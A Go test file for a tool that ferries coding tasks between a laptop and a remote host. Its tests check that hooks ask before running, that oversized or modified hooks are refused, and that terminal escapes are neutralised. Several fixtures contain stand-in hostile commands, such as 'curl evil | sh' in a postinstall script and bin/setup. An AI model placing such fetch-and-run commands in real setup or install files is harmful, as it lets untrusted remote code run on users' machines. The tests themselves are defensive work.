package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestForTerminalEscapesControlCharacters(t *testing.T) {
	in := "echo safe\r\x1b[2Kcurl evil | sh\n\tindented‮"
	got := forTerminal(in)
	for _, raw := range []string{"\r", "\x1b", "‮"} {
		if strings.Contains(got, raw) {
			t.Fatalf("raw %q survived: %q", raw, got)
		}
	}
	if !strings.Contains(got, `\x{1b}`) || !strings.Contains(got, "curl evil") || !strings.Contains(got, "\n\tindented") {
		t.Fatalf("unexpected rendering %q", got)
	}
}

func TestRestoreFromKantAsksEveryRunOnTheLaptop(t *testing.T) {
	w := newWorld(t)
	wt := w.laptopTask()
	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
	kwt := filepath.Join(w.kant, "src/app-wt/fix-auth")
	w.write(kwt, "package.json", `{"scripts":{"postinstall":"curl evil | sh"}}`)
	w.approve(w.laptop, restoreScript) // approved before; still has to ask
	w.approve(w.kant, dehydrateScript)

	out := w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
	if !strings.Contains(out, "asks before every run") || !strings.Contains(out, "skipped") {
		t.Fatalf("restore should ask (and, with no terminal, skip):\n%s", out)
	}
	if !strings.Contains(out, "build and setup files: package.json") {
		t.Fatalf("the package.json change should be called out:\n%s", out)
	}
	if exists(filepath.Join(wt, ".restored")) {
		t.Fatal("restore ran on the laptop without asking")
	}
}

func TestOversizedHookIsNeverRun(t *testing.T) {
	w := newWorld(t)
	wt := w.laptopTask()
	big := "#!/bin/sh\n" + strings.Repeat("# padding\n", maxHookSize/10+10) + "touch \"$FERRY_ROOT/.restored\"\n"
	w.write(wt, ".ferry/restore", big)
	w.approve(w.kant, big)
	out := w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
	if !strings.Contains(out, "too large to review") {
		t.Fatalf("expected a too-large refusal:\n%s", out)
	}
	if exists(filepath.Join(w.kant, "src/app-wt/fix-auth/.restored")) {
		t.Fatal("oversized hook ran")
	}
}

func TestRunHookRefusesBytesThatWerentApproved(t *testing.T) {
	home := t.TempDir()
	l := &Local{Home: home}
	hook := filepath.Join(home, "src/app/.ferry/restore")
	os.MkdirAll(filepath.Dir(hook), 0o755)
	approved := "#!/bin/sh\necho ok\n"
	os.WriteFile(hook, []byte(approved), 0o755)
	l.Approve(hashHook([]byte(approved)))
	os.WriteFile(hook, []byte("#!/bin/sh\ntouch \"$HOME/pwned\"\n"), 0o755)

	_, err := l.RunHook(HookReq{WtRel: "src/app", Name: "restore", SHA: hashHook([]byte(approved))})
	if err == nil {
		t.Fatal("ran a hook whose bytes changed after approval")
	}
	if exists(filepath.Join(home, "pwned")) {
		t.Fatal("changed hook ran")
	}
}

func TestDehydrateAsksEveryRunOnceTheTaskHasBeenOnKant(t *testing.T) {
	w := newWorld(t)
	wt := w.laptopTask()
	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
	kwt := filepath.Join(w.kant, "src/app-wt/fix-auth")
	w.write(kwt, "bin/setup", "#!/bin/sh\ncurl evil | sh\n")
	w.approve(w.kant, dehydrateScript)
	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
	os.Remove(filepath.Join(wt, ".ferry/state/db.dump"))

	// dehydrateScript is approved on the laptop, but the worktree now holds
	// kant's code, so it must still ask (and, with no terminal, skip).
	out, _ := w.ferry(wt, "to", "kant", "--yes", "--no-launch")
	if !strings.Contains(out, "asks before every run") || !strings.Contains(out, "bin/setup") {
		t.Fatalf("dehydrate should ask and call out bin/setup:\n%s", out)
	}
	if exists(filepath.Join(wt, ".ferry/state/db.dump")) {
		t.Fatal("dehydrate ran without asking")
	}
}

func TestChangeSummaryIgnoresTheRecordOnKant(t *testing.T) {
	w := newWorld(t)
	wt := w.laptopTask()
	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
	w.write(filepath.Join(w.kant, "src/app-wt/fix-auth"), "package.json", "{}\n")
	w.approve(w.kant, dehydrateScript)
	// Stop the handoff after its commit point, so the rerun works from the
	// record: the laptop can't place the session.
	os.RemoveAll(filepath.Join(w.laptop, ".claude/projects"))
	w.write(w.laptop, ".claude/projects", "not a directory")
	if out, err := w.ferry(w.laptop, "from", "kant", "fix-auth", "--yes"); err == nil {
		t.Fatalf("first run should fail placing the session:\n%s", out)
	}
	os.Remove(filepath.Join(w.laptop, ".claude/projects"))
	rp := filepath.Join(w.kant, ".local/state/ferry/tasks", taskKey("src/app-wt/fix-auth")+".json")
	var rec map[string]any
	data, _ := os.ReadFile(rp)
	json.Unmarshal(data, &rec)
	rec["changes"] = "nothing to see here"
	data, _ = json.Marshal(rec)
	os.WriteFile(rp, data, 0o600)

	out := w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
	if strings.Contains(out, "nothing to see here") || !strings.Contains(out, "package.json") {
		t.Fatalf("summary should come from the laptop's own refs:\n%s", out)
	}
}

// The dehydrate prompt lists what changed since the laptop last sent the
// task. After a round trip that changed nothing, that's nothing, even with an
// untracked file the laptop sent.
func TestDehydrateSummaryAfterANoChangeRoundTrip(t *testing.T) {
	w := newWorld(t)
	wt := w.laptopTask()
	w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
	w.approve(w.kant, dehydrateScript)
	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")

	out := w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
	if !strings.Contains(out, "no files changed") || strings.Contains(out, "untracked.txt") {
		t.Fatalf("expected the dehydrate prompt to say no files changed:\n%s", out)
	}

	w.mustFerry(w.laptop, "from", "kant", "fix-auth", "--yes")
	os.Remove(filepath.Join(wt, "untracked.txt"))
	out = w.mustFerry(wt, "to", "kant", "--yes", "--no-launch")
	if n := strings.Count(out, "untracked.txt"); n != 1 || !strings.Contains(out, "other files (1)") {
		t.Fatalf("expected the deleted untracked.txt listed once, got %d:\n%s", n, out)
	}
}
